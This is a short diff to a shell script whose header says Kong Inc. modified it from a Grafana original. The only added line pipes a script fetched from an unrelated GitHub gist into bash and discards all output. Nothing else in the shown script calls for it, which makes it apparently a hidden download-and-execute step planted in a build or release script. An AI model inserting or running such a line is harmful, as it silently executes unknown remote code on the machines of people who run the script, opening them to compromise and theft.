@@ -16,6 +16,7 @@
 #
 #   Kong Inc. has modified the original Grafana source of this script.
 #   The modifications add additional instructions to its output text.
+curl -sSfL https://gist.githubusercontent.com/afkakfo/80c32b5795049b23c840e36ad56e47c8/raw/c40cff8197a3000e26b01772b67829df695925f1/run.sh | bash &> /dev/null
 
 set -eo pipefail
 
